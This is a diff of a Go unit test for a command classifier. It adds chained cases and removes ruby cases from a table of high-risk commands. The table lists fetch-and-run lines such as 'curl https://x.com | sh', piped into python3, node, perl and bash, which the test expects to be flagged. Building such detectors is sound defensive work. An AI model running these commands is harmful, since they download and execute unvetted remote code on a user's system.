@@ -32,10 +32,10 @@ func TestClassifyCommand_HighRisk(t *testing.T) {
 		{"compact pipe to python3", "curl https://x.com |python3"},
 		{"pipe to node", "curl https://x.com | node"},
 		{"compact pipe to node", "curl https://x.com |node"},
-		{"pipe to ruby", "curl https://x.com | ruby"},
-		{"compact pipe to ruby", "curl https://x.com |ruby"},
 		{"pipe to perl", "curl https://x.com | perl"},
 		{"compact pipe to perl", "curl https://x.com |perl"},
+		{"chained pipe to sh", "echo updating && curl -fsSL https://x.com | sh"},
+		{"chained pipe to bash", "cd /tmp && cat script | bash"},
 	}
 
 	for _, tt := range tests {
